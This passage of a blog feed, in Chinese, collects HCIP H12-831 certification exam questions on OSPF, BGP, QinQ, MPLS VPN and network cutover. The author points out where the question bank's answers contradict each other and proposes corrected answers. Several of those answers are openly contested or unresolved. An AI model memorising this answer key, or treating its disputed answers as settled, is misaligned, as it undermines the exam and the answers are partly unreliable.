为原话</font></p></blockquote></li><li><p><strong>判断题235与405同一个问题答案矛盾</strong></p><p>这个判断题应该是对的，解析如下来源PPT 05 以太网交换安全</p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/MAC地址表项解析.png" style="zoom: 60%;" /></li><li><p><strong>237与439相同题目 答案矛盾</strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/237题图.png"  /><blockquote><p><font color="orangered">答案应选择C，在CE多归属的情况下，使能BGP AS号替换功能可能引起路由环路，可以通过BGP Soo防止VPN站点内路由环路，PE会为从CE收到的路由添加Soo属性并发布给所有BGP对等体 </font></p></blockquote></li><li><p><strong>250与375这两道题答案不一致，增加到<code>4094*4094</code>应该是对的吧</strong></p><img src="C:\Users\888888\Desktop\HCIP现有题目汇总\3.1题.jpg" style="zoom: 50%;" /><img src="C:\Users\888888\Desktop\HCIP现有题目汇总\3.2题.jpg" style="zoom: 50%;" /><blockquote><p><font color="orangered">解析：选D, D选项太绝对了，基本QinQ是基于接口方式实现的。开启接口的基本QinQ功能后，当该接口接收到报文，设备会为该报文打上配置的外层Tag。如果接收到的是已经带有VLAN Tag的报文，则为其加上外层VLAN Tag；如果接收到的是不带VLAN Tag的报文，则先为其加上内层VLAN Tag，再加上外层Tag</font></p></blockquote></li><li><p><strong>272  这两个题答案一致，但是和华为的产品文档里的内容对不上</strong> </p><img src="C:\Users\888888\Desktop\HCIP现有题目汇总\9.1题.png" style="zoom: 60%;" /><blockquote><p><font color="blue">解析:</font></p><img src="C:\Users\888888\Desktop\HCIP现有题目汇总\9题解析.jpg" style="zoom:60%;" /></blockquote><blockquote><p><font color="red">解析：选A,存在质疑</font></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/272题疑惑.jpg"  /> </blockquote></li><li><p><strong>288与394答案矛盾</strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/288题.jpg" style="zoom:60%;" /><blockquote><p><font color="orangered">解析：选B，通常将设备作为FTP或TFTP的客户端</font></p></blockquote></li><li><p><strong><font color="red">302，988，1068三道题 <code>黑洞MAC地址的报文</code></font></strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/302题.png" style="zoom: 60%;" /><blockquote><p><font color="blue">第一次那个描述我也有疏忽，主要是1068与302两题答案冲突，302写了当且仅当收到源MAC地址为黑洞MAC地址的报文，直接丢弃，所以我认为302与1068答案应该选B</font></p></blockquote><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/黑洞MAC地址表项.png" style="zoom: 90%;" /><blockquote><p><font color="orangered">解析：302 与1068 题 错 988题 正确</font></p></blockquote></li><li><p><strong>314与324 题</strong>    </p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/314题.png" style="zoom:60%;" /><blockquote><p><font color="blue">isis timer holding-multiplier number [ level-1 | level-2 ]用来配置IS-IS的邻居保持时间 ，邻居保持时间为Hello报文发送间隔乘以Hello报文发送间隔的倍数，所以D肯定是错的….</font></p></blockquote><blockquote><p><strong><font color="red">解析：发送Hello报文的间隔时间为缺省值10秒，修正D选项：该接口发送Level-2的Hello报文的间隔时间是5倍</font></strong></p></blockquote></li><li><p><strong><font color="red">323题与446题相同，答案不同</font></strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/323题.png" style="zoom:60%;" /><blockquote><p><strong>这里必须注明这里是没确定结果的一题 <font color="blue">我认为是ABD 正确 不包括C选C</font> ，<font color="red">博赛那边认为选A</font></strong></p></blockquote><p>依照<strong>PPT  12 网络割接内容快照</strong>内容应包括如下：</p><ul><li><p>现网配置进行备份</p></li><li><p>现网动态数据采集[端口状态、流量、各路由协议状态、路由数量、STP协议状态、各端口ARP/MAC地址表项]</p></li><li><p>割接前对业务进行测试，确保割接涉及的业务在割接前属于正常状态</p></li></ul></li><li><p><strong>464 938 943 三道题答案矛盾</strong></p><p><img src="https://shierjinghuang.github.io/2023/09/18/%E5%86%8D%E6%88%98HCIP/464%E9%A2%98.jpg"></p><blockquote><p>答案ABC,<del>两道单选应该是选正确的？</del></p></blockquote></li><li><p><font color="red"><strong>472与534矛盾 ，472题希望得到详细解答</strong></font></p><p>某园区部署OSPF协议实现网络互通，工程师对R2做了配置，具体配置如图所示，则以下关于OPSF网络内的LSA的描述，错误的是哪一项？</p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/472题.jpg" style="zoom:60%;" /><p>A、Area2内有Type 5 LSA泛洪<br>B、Area2内没有TYPE 3 LSA泛洪<br>C、Area1内有TYPE5 LSA泛洪<br>D、Area1内没有TYPE3LSA泛洪</p><blockquote><p>解析：选择 B  FILTER为路由过滤工具不能过滤LSA………….</p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/472题解析.png" style="zoom:60%;" /></blockquote></li><li><p><strong>478 <code>三选项选D</code>，答案应该为C  Route A，优先选MED值较小的一个</strong></p><p><img src="https://shierjinghuang.github.io/2023/09/18/%E5%86%8D%E6%88%98HCIP/478%E9%A2%98.png"></p></li><li><p><strong>479 题  RR只传递最优的路由条目应该只有10吧</strong></p><img src="C:\Users\888888\Desktop\HCIP现有题目汇总\8题.png" style="zoom:67%;" /><blockquote><p><font color="orangered">解析：选D  RR是BGP中的路由反射器，通过采用路由反射器，让Client客户端路由器都连接到RR，减少区域内的路由规模、加快收敛，本题中两条路径共计20条路由</font></p></blockquote></li><li><p><font color="red">499与540题答案矛盾</font></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/499题.png" style="zoom:80%;" /><blockquote><p>这一题目希望得到解析</p></blockquote><blockquote><p>解析：<font color="orangered">选C    ospf的不同路由路由类型是有优先级的，总的来说就是域内&gt;域间&gt;域外（type1 type2）,对于R1来说，R2通告的10.0.2.2路由到区域1中，是域内路由优先级最高，所以其COST为200</font></p></blockquote><p><strong>499  如图所示，路由器所有的接口开启OSPF，链路的ost值如图中标识。若在R2的OSPF进程中通过命令import-route direct type 1引入直连路由，则RI到达10.0.2.2/32的ost值是以下哪一选项？（ ）</strong>  </p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbee696a86/word/media/image55.png" style="zoom:50%;" /><p><del>答案选择C项 200，但是因为是import 引入所以应该是201吧</del></p><blockquote><p>博赛那边的师哥反馈这题为 200</p><blockquote><p><font color="orangered">解析：ospf的不同路由路由类型是有优先级的，总的来说就是域内&gt;域间&gt;域外（type1 type2）,对于R1来说，R2通告的10.0.2.2路由到区域1中，是域内路由优先级最高，所以其COST为200.</font></p></blockquote></blockquote><blockquote><p><del>大家可以看见这个 我问了两次 我还是认为是201</del></p></blockquote></li><li><p><strong>505 HCIP-831题库     这题答案还是有矛盾 方便修改解答一下吗</strong></p><img src="C:\Users\888888\Desktop\HCIP现有题目汇总\2题.png" style="zoom: 67%;" /><blockquote><p><font color="orangered">解析：选C,该图为查看isis的错误信息, Repeated System ID为系统ID重复。17代表收到了17个错误报文，并不一定是收到了17个hello报文，也无法判断与邻居的system id重复，无法判断R3上是否存在邻居，R3一定存在isis的进程</font></p></blockquote></li><li><p><strong>第506题与560题题干完全相同，答案不一致</strong></p><p>如图所示的PIM-SM组播网络，R3为RP，所有路由器运行OSPF，且每条链路的Cost值相等，其他参数为默认值，则Receiver1接收组播数据流的稳定路径是以下哪一项? （ ） </p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/506题.png" style="zoom: 80%;" /><p><strong>显然在没有其他条件的情况下会是 Sourcel-R1-R4-Receiver1 这一路径，而 Sourcel-R1-R3-R4-Receiver1 的路径发生在那一道R4配置了永不发起SPT切换的题目中</strong></p></li><li><p><strong><font color="red">第512，939，965三道题一样的题干，三道题三个答案…..</font></strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/512题.png" style="zoom: 60%;" /><blockquote><p><del><font color="blue">虽然笔者也认为这一题单选65535就行，但是上次考HCIP确实遇到了这一题目，而且就算多选这几个选项…..</font></del></p><blockquote><p><font color="orangered">补充：不会出现这一道的单选 这是博赛老师在导入图块时出现了问题，多选解析见下方</font></p></blockquote></blockquote></li><li><p><strong>题520与521 判断题 AB选C….</strong></p><blockquote><p>第520、521题 520答案 B  521答案 A</p></blockquote></li><li><p><strong>补充544题</strong></p></li><li><p><strong>561.这个设置了永不发起STP，答案不该是B吗？</strong></p><img src="C:\Users\888888\Desktop\HCIP现有题目汇总\5题.png" style="zoom:60%;" /></li><li><p><font color="red">564，914 ，969<strong>三题目相同，单选与多选答案矛盾，两道多选答案不同</strong>，结合所学，单选564答案应该错误，两道多选不能确定……</font></p><p><img src="https://shierjinghuang.github.io/2023/09/18/%E5%86%8D%E6%88%98HCIP/564%E9%A2%98.png"></p><p><font color="red">解析：选择ABD   A选项是正确的，可能是管理员录题的时候出错了没有把db写上，我们从图片的倒数几行可以得到IPv6的地址，B选项可以从9行就可以确定，C选项描述的是本地IPv6地址而非吓一跳，D 选项 MP-UNREACH撤销报文，描述的是当前撤销的IPv6路由。</font></p></li><li><p><strong>573，594，672，804，861五道一样的题，出来三个答案，<del>个人认为时804与861少选了一项</del></strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/573题.png" style="zoom: 60%;" /><blockquote><p><font color="red">所以这几个题都是ABC这三个选项</font></p></blockquote></li><li><p><strong>575，719两道题目在</strong> <code>割接验收完成后在收尾阶段还需要执行的工作一般包括哪些？</code>中包含了<strong>现场守局</strong> 而 822题并未包含<strong>现场守局</strong></p><blockquote><p>822题目个人认为缺少现场守局，不需要割接后快照，但确实应该含现场守局</p><p><strong>575、719、822题  现在守局还是割接后收尾的必要内容吧</strong></p><img src="C:\Users\888888\Desktop\HCIP现有题目汇总\15题.png" style="zoom:60%;" /><blockquote><p> <font color="orangered"> 解析：822题 选择 ABC  收尾阶段包括守局和项目验收，项目验收又包括转维培训、资料移交、验收总结会</font></p></blockquote></blockquote></li><li><p><strong>595题</strong></p><p><img src="https://shierjinghuang.github.io/2023/09/18/%E5%86%8D%E6%88%98HCIP/595%E9%A2%98.png"></p><p>选择AC</p></li><li><p><strong>604题为一道排序题，单列选项没有意义</strong>….正确顺序应该如下：</p><ol><li><p>安装新设备并配置 </p></li><li><p>将业务从老设备割接到新设备 </p></li><li><p>割接完成后,观察网络在新设备的状态 </p></li><li><p>在新设备上面执行业务检查 </p></li><li><p>确保新设备的业务运行正常后,老设备下线 </p></li></ol></li><li><p><strong>623题 这一题目A项也应该正确吧</strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/626题.png" style="zoom:60%;" /><blockquote><p> <font color="orangered"> 解析：选择 第一个、第二个、第三个 平台答案已更正</font></p></blockquote></li><li><p><strong>641题 这个主动请求是发到discover报文吧？</strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/641题.png" style="zoom:60%;" /><blockquote><p>解析：第二个和第四个选项</p></blockquote></li><li><p><font color="red"><strong>646题 可能全选？：</strong></font> </p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/642题解析.png" style="zoom:60%;" /><blockquote><p><font color="orangered">解析：选择  AB   实现包过滤的核心技术是访问控制列表。包过滤防火墙只根据设定好的静态规则来判断是否允许报文通过，提供了对后续分片报文的检测过滤，以及非分片报文的检测过滤。所以正确答案是“后续分片报文”、“非分片报文 ”</font></p></blockquote><blockquote><p>然而: 我现在觉得是A B D</p><p><img src="https://shierjinghuang.github.io/2023/09/18/%E5%86%8D%E6%88%98HCIP/646%E9%A2%98%E8%A7%A3%E6%9E%902.png"></p></blockquote></li><li><p><strong>659题 接收过程如果是缓冲区不足等情况也是会产生丢包吧</strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/659题.png" style="zoom:60%;" /><blockquote><p><font color="orangered">解析：全选</font></p></blockquote></li><li><p><strong>709与721关于外层标签与内层标签的表述矛盾，709可能少选一项错误选项<code>D</code></strong></p><p><img src="https://shierjinghuang.github.io/2023/09/18/%E5%86%8D%E6%88%98HCIP/709%E9%A2%98.png"></p><blockquote><p>答案BD</p></blockquote></li><li><p> 721 题</p></li></ul>  <img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/721题.png" style="zoom:67%;" /><ul><li><p><strong>多选 724 799 817三题矛盾</strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/724题.png" style="zoom:67%;" /><blockquote><p><font color="orangered"> 解析：选择第三个第四个 ，割接实施完成后为测试割接是否成功，需要从以下几个方面对网络进行测试</font></p><p><font color="orangered"> 业务进行测试：网络运行状态测试：对网络的动态数据再进行一次采集，与割接前进行对比。业务测试：通过ping、tracert或者客户侧的第三方软件测试网络连通性、延迟、抖动等指标是否到达业务要求</font></p><p><font color="orangered"> 客户应用测试：测试由网络承载的客户应用，检查是否正常</font></p><p><font color="orangered"> 数据流向、控制层面表项即网络测试。软件版本和物理拓扑在割接中可能改变</font></p><p><font color="orangered"> 因此答案选CD</font></p></blockquote><blockquote><p><del><font color="blue"><strong>这题个人认为是全选</strong></font></del></p></blockquote></li><li><p><strong>735与784 807 829题目相同 735少选一项？</strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/735题.png" style="zoom:67%;" /><blockquote><p>四道题应该都是A、B、C </p></blockquote></li><li><p><strong>738与830 同样的题目 830的选项中没有选择 <code>DHCP Server仿冒者攻击</code></strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/738题.png" style="zoom:80%;" /><blockquote><p>答案ACD</p></blockquote><p><strong>752 798 844 三道多选一样的题干 三个答案…</strong></p><p>答案应为 ABD</p><p><img src="https://shierjinghuang.github.io/2023/09/18/%E5%86%8D%E6%88%98HCIP/752%E9%A2%98.png"> </p></li><li><p><strong>754与846题 这一题目是否包含4类LSA?</strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/846题.png" style="zoom:60%;" /><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/846题解析.png" style="zoom: 80%;" /><blockquote><p> <font color="orangered"> 全选</font></p></blockquote></li><li><p><strong>755与881矛盾</strong></p><p><img src="https://shierjinghuang.github.io/2023/09/18/%E5%86%8D%E6%88%98HCIP/755%E9%A2%98.png"></p><p><strong>答案ABCD</strong></p><blockquote><p><font color="blue">解析:</font></p><p><font color="blue"><strong>timer lsp-refresh  refresh-value</strong>     配置LSP的刷新时间</font></p><p><font color="blue"><strong>timer lsp-generation</strong> max-interval [ init-interval  [ incr-interval] ] [ level-1 | level-2 ]  配置LSP生成的智能定时器</font></p><p><font color="blue">**flash-flood [ lsp-count | max-timer-interval interval | [ level-1 | level-2 ] ]**，使能LSP快速扩散</font></p><p><font color="blue"><strong>lsp-length</strong> **originatemax-size ** 配置生成LSP的大小</font></p></blockquote></li><li><p><strong>764与853 相同题目，而764少选择一项<code>该命令最多经过Y个站点</code>     应该选择A B C</strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/764题.png" style="zoom: 70%;" /><blockquote><p> <font color="blue">-m Y 意思是TTL 值设置为 Y，这一选项理应正确 </font></p></blockquote></li><li><p><strong>767与859 题目相同选项不同</strong>，767题没有选择<code>若在某ASBR路由器进程中配置命令default-route-advertise always, 则ASBR中必须存在激活的非0SPF缺省路由，才会产生缺省路由的LSA</code>这一项</p></li></ul><p><img src="https://shierjinghuang.github.io/2023/09/18/%E5%86%8D%E6%88%98HCIP/767%E9%A2%98.png"></p><p>答案BD</p><ul><li><p><strong>786题 AS号不一致？怎么理解 AS号重复才会出问题吧 AS号正常应该是不一致吧</strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/786题.png" style="zoom:60%;" /><blockquote><p> <font color="orangered"> 解析：选第二个和第四个选项，</font></p></blockquote></li><li><p><strong>789. 这题应该是除了性别之外全选</strong></p><img src="C:\Users\888888\Desktop\HCIP现有题目汇总\11题.bmp" style="zoom: 50%;" /><blockquote><p>解析：选择 第一、第三、第四 </p></blockquote><img src="C:\Users\888888\Desktop\HCIP现有题目汇总\11题解析.png" style="zoom: 50%;" /></li><li><p><strong>题目806与868答案矛盾</strong></p><p><img src="https://shierjinghuang.github.io/2023/09/18/%E5%86%8D%E6%88%98HCIP/%E9%A2%98806.png"></p><p>答案B C</p><blockquote><p><font color="blue">PE上分配私网标签的方法有如下两种：</font></p></blockquote><blockquote><p><font color="blue">基于路由的MPLS标签分配：为VPN路由表的每一条路由分配一个标签（one label per route）这种方式的缺点是：当路由数量比较多时，设备入标签映射表ILM（Incoming Label Map）需要维护的表项也会增多，从而提高了对设备容量的要求</font></p></blockquote><blockquote><p><font color="blue">基于VPN实例的MPLS标签分配：为整个VPN实例分配一个标签，该VPN实例里的所有路由都共享一个标签。使用这种分配方法的好处是节约了标签</font></p></blockquote></li><li><p><strong>816与883题</strong></p><blockquote><p><font color="orangered">解析：两端的VRRP备份组抢占延时配置不一致 不会引起VRRP备份组震荡</font></p></blockquote></li><li><p><strong>818与884 矛盾</strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/818题.png" style="zoom: 80%;" /><blockquote><p><del><font color="blue">A $会匹配串尾成功匹配，C 10. 能匹配到100，D项.*任意匹配，C 项无法匹配</font></del></p></blockquote><blockquote><p>这题貌似有问题已经反馈了 等老师回复</p></blockquote></li><li><p><strong>851题与761题答案不一致</strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/761与851题.png" style="zoom:60%;" /><blockquote><p>解析:选择第一和第二 （RT在扩展团体中携带）</p></blockquote></li><li><p><strong>884 这题答案可能错误，正确答案应该是ABCD吧</strong> </p><img src="C:\Users\888888\Desktop\HCIP现有题目汇总\10题.png" style="zoom: 50%;" /></li><li><p><strong>904 与 913 933 961 四个题答案不同</strong></p><blockquote><p>解析：选择ABCD,以961题为标准吧，都可以从图中看出来。</p></blockquote></li><li><p><strong>929与964题目相同 答案不同，<del>应为964多选了</del></strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/929题.png" style="zoom:80%;" /><blockquote><p>选择AD</p></blockquote></li><li><p>962题 B项应该是对的</p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/962题.png" style="zoom:60%;" /><blockquote><p>解析：本图中R3并不是ABR ，所以无法产生3类lsa C错</font></p><p><font color="orangered">因此R5的环回口路由信息是无法发送给area 0 和area 1 的， R2属于ABR能够产生3类lsa使area 0和area 1 的设备互通。R1、R2、R3环回口都再area 1 ，因此可以互相ping通</font></p><blockquote><p> <font color="blue">注 虽然这么解释  但是…R3的环回口在也区域2里啊……. </font></p></blockquote><p>综上 这题应该是AC ,B与D正确</p></blockquote></li><li><p><strong>965 . 这个题的准确答案是什么呢，题库里的答案有好几种,辛苦老师帮忙解答一下</strong></p></li></ul><img src="C:\Users\888888\Desktop\HCIP现有题目汇总\1题.png" style="zoom: 50%;" /><blockquote><p><font color="orangered">解析：选C D  ，display mac-address flapping record  该命令 为查看MAC地址漂移历史记录，图中最后一列MoveNum就代表MAC地址发生漂移的次数，其最大值为65535，即当漂移次数大于65535时，MoveNum仍为65535.</font></p></blockquote><ul><li><p><strong>966题</strong></p><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/966题.png" style="zoom:60%;" /><blockquote><p>这一题答案应该选A B</p></blockquote></li><li><ol start="978"><li> Total Error 计数是不归零的 这题应该错误吧**</li></ol></li></ul><img src="C:\Users\888888\Desktop\HCIP现有题目汇总\12题.png" style="zoom: 50%;" /><blockquote><p><font color="orangered">解析：选B  ,Total Error接口在物理层检测时发现的错误报文总数目。首先收到错误报文并不一定就代表着接口就一定有故障，可能是链路干扰或者不稳定导致收到畸形报文。其次即便因为之前有故障，ERROR计数不为0，待故障恢复正常后，其总数目并不会恢复为0.判断物理端口要看其current state，而不是total error计数</font></p></blockquote><ul><li><strong>984.题库莫名的把基本和灵活Qinq没有分开….</strong></li></ul><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/基本Qinq.png" style="zoom:60%;" /><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/基本Qinq.png" style="zoom:60%;" /><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/Qinq解析.png" style="zoom:50%;" /><blockquote><p> <font color="orangered"> 综上 基本是错的 灵活是对的</font></p></blockquote><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/Qinq解析2.png"  /><ul><li><strong>989. 这个真能对？</strong></li></ul><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/989题.png" style="zoom: 60%;" /><blockquote><p> <font color="orangered"> 解析：选B  严谨的说，无论什么时候都不能仅凭借经验快速解决故障，要通过看到了实际问题去解决问题</font></p></blockquote><ul><li><strong>992. 这个应该还可以用GRE啥的来建立公网隧道吧</strong></li></ul><img src="C:\Users\888888\Desktop\HCIP现有题目汇总\992题.png" style="zoom:60%;" /><blockquote><p><font color="orangered"> 解析：选择A，MPLS VPN网络，需要使用标签</font></p><blockquote><img src="https://shierjinghuang.github.io/2023/09/18/再战HCIP/GRE隧道实例.png" style="zoom:67%;" /><p>然而我提出这个问题本来就意味着我知道这题答案 这题应该是错了</p></blockquote></blockquote><ul><li><p><strong>1000 这个题 答案关于广播域的判断应该出错</strong></p><img src="C:\Users\888888\Desktop\HCIP现有题目汇总\7题.jpg" style="zoom:60%;" /><img src="C:\Users\888888\Desktop\HCIP现有题目汇总\VLAN聚合的原理.png" style="zoom: 50%;" /><blockquote><p><font color="orangered">解析：选B，对应一个广播域</font></p></blockquote></li><li><p><strong>1154 这题是连线吧 而且作为填空没答案</strong></p></li></ul><img src="C:\Users\888888\Desktop\HCIP现有题目汇总\6题.png" style="zoom:50%;" /> <blockquote><p><font color="blue">这题 300 400 100 200 </font></p></blockquote><blockquote><p><font color="orangered">该题应为连线题，云平台录不进去 加了解析</font></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;831新题库问题题目汇总&quot;&gt;&lt;a href=&quot;#831新题库问题题目汇总&quot; class=&quot;headerlink&quot; title=&quot;831新题库问题题目汇总&quot;&gt;&lt;/a&gt;831新题库问题题目汇总&lt;/h2&gt;&lt;pre class=&quot;line-numbers language</summary>
      
    
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/categories/HCIP/"/>
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/tags/HCIP/"/>
    
    <category term="网络工程" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>H12-831新题库连线题汇总</title>
    <link href="https://shierjinghuang.github.io/2023/09/15/H12-831%E8%BF%9E%E7%BA%BF%E9%A2%98%E6%B1%87%E6%80%BB/"/>
    <id>https://shierjinghuang.github.io/2023/09/15/H12-831%E8%BF%9E%E7%BA%BF%E9%A2%98%E6%B1%87%E6%80%BB/</id>
    <published>2023-09-15T10:32:31.000Z</published>
    <updated>2023-09-19T01:32:07.872Z</updated>
    
    <content type="html"><![CDATA[<h3 id="H12-831新题库连线题汇总"><a href="#H12-831新题库连线题汇总" class="headerlink" title="H12-831新题库连线题汇总"></a>H12-831新题库连线题汇总</h3><p><strong>2 如图所示,有一个包含三层标签头部的报文,请分别选取图中X、Y、Z字段对应的取值(十进制)</strong></p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image99.png"/><p><strong>3 OSPFv2是运行在IlPv4网络的IGP。OSPFV3是运行在IPv6网络的IGP。OSFv3与OSPFv2相比,具有类似的LS,但是功能略有区别。以下是关于OSPFv3的LS功能的措述,请将LS拖拽到正确的LS功能栏</strong></p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image138.png" style="zoom:80%;" /><p><strong>4 如图所示,路由器运行OSPF, rea2是完全末节区域,请将各区域包含的LS的类型和区域ID进行匹配。(  )</strong>  </p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image100.png" style="zoom: 60%;" /><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image101.png" style="zoom:75%;" /><p><strong>4 网络管理员需要permit或deny一些特定的路由,但是管理员对于配置并不熟练,请帮助管理员合理的排序配置,使设备能按图中的要求permit或deny特定的路由 (  )</strong>  </p><img src="D:\blog\shierjinghuang\source\_posts\H12-831连线题汇总\1694761225489.png" style="zoom: 90%;" /><img src="D:\blog\shierjinghuang\source\_posts\H12-831连线题汇总\1694761197839.png" style="zoom:75%;" /><p><strong>5 请将OSPFv3 LS与其传递范围对应起来。(  )</strong>  </p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image111.png"  /><p><strong>6 如图所示，为了实现Sitel和Site2之间的流量通过Hub-CE，现已经配置了两台Spoke-PE上的VPN实例，Hub-PE上需要创建两个VPN实例，实例VPN_in用于接收Spoke-PE发来的路由，实例VPN_out用于向Spoke-PE发布路由，请分别选择这两个实例的Import RT和Export RT</strong></p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image132.png" style="zoom: 50%;" /><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image133.png" style="zoom:75%;" /><blockquote><p>这题答案貌似有问题 </p></blockquote><p> <strong>请按照割接执行步骤排序</strong>  </p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image104.png" alt="img" style="zoom:120%;" /><blockquote><p>我那个文档里有文字版本</p><ol><li><p>安装新设备并配置 </p></li><li><p>将业务从老设备割接到新设备 </p></li><li><p>割接完成后,观察网络在新设备的状态 </p></li><li><p>在新设备上面执行业务检查 </p></li><li><p>确保新设备的业务运行正常后,老设备下线 </p></li></ol></blockquote><p><strong>7 R2上执行了如图所示的配置来过滤所有接收的路由。假设R1上有一条S_Path属性为【100200300400】的BGP路由需要发往R2，请帮助网络管理员在RI上调整该路由的S_Path属性中S的顺序，保证路由条目不会被R2的路由策略过滤</strong></p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image136.png" style="zoom: 80%;" /><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image137.png" style="zoom: 80%;" /><p><strong>8 R2上执行了如图所示的配置来过滤所有接收的路由。假设R1上有一条S_Path属性为【100200300400】的BGP路由需要发往R2，请帮助网络管理员在RI上调整该路由的S_Path属性中S的顺序，保证路由条目不会被R2的路由策略过滤</strong></p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image102.png" style="zoom: 60%;" /><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image103.png" style="zoom: 60%;" /><p><strong>9 在遇到网络故障时，工程师经常使用分层故障处理法，因为所有模型都遵循相同的基本前提，当模型的所有低层结构工作正常时，它的高层结构才能正常工作。请根据分层法将下列检查项和对应的层次匹配</strong>  </p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image131.png" style="zoom: 90%;" /><p><strong>10 请将命令与实现的功能对应起来</strong> </p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image130.png" style="zoom: 80%;" /><p><strong>11 华为路由器缺省的MPLS标签发布方式、标签分配控制方式、标签保持方式分别是</strong>  </p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image129.png" style="zoom: 70%;" /><p><strong>12 以下是关于OSPFv3的LSA功能的描述，请将LSA拖搜到正确的LSA功能栏</strong></p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image128.png" style="zoom: 40%;" /><blockquote><p>这个我稍后给解析….</p><blockquote><p>Type3：Inter-Area-Prefix-LSA 描述区域内某个IPv6地址前缀的路由，并通告给其他相关区域</p></blockquote><blockquote><p>Type9：Intra-Area-Prefix-LSA  Type9 LSA描述的是网段信息，只在所属的区域内传播</p></blockquote><p>明显第一张图错了……..</p></blockquote><p><strong>13 在BGP/MPLS IP VPN场景中，如果PE设备收到到达同一目的网络的多条路由时将按照一定的顺序选择最优路由。请将以下内容按照比较顺序进行排序</strong></p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image114.png"  /><p><strong>14 请将下列DHCP攻击类型和相应解释配对</strong></p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image134.png" style="zoom:80%;" /><p><strong>15 网络运维人员可以通过查看设备产生的Log、Trap和Debug信息，实现对设备运行状态的监控以及定位网络故障。请将以下信息类型和其记录的信息内容进行一一对应</strong></p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image112.png" style="zoom:110%;" /><p><strong>16 在BGP网络中，可以通过正则表达式来匹配路由中的S_Path，再利用S-Path Filter对匹配上的路由进行过滤，从而达到路由控制的目的。请将以下正则表达式与匹配的S_Path进行一一对应</strong></p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image113.png" style="zoom:110%;" /><p> <strong>17 如图所示的网络，请根据R1和R2的配置，将路由器名称与角色进行匹配</strong></p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image109.png" style="zoom:110%;" /><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image110.png" style="zoom:110%;" /><p><strong>18 如图所示，某网络部署OSPF实现网络互通，其中Area1部署为Stub区域，Area2部署为NSS区域，R4的环回口Loopback0未开启OSPF.若在R4的OSPF进程内通过命令import-route direct将环回口地址引入到OSPF网络中，使得其他设备可以访问该环回口地址。基于以上场景，请将各区域及其包含的LS进行匹配</strong></p><img src="http://www.ibossay.com/data/upload/2023/0711/10/64acbd6274ad7/word/media/image122.png" style="zoom:75%;" /><p><strong>19 